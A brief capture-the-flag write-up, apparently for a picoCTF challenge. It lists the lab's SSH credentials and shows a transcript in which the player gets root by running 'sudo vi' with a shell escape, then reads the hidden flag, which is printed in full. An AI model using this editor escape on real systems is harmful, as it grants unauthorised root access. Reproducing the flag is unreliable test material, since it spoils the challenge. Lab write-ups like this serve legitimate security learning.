
**Descripción** 
Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 52113 picoplayer@saturn.picoctf.net`Password: `UYiOazkqY2`Can you login and read the root file?


**Solución**
picoplayer@challenge:~$ sudo vi -c ':!/bin/bash'
[sudo] password for picoplayer: 

root@challenge:/home/picoplayer# whoami
root
root@challenge:/home/picoplayer# cd /root
root@challenge:~# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Feb 22 02:36 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:~# cat /root/.flag.txt
picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}
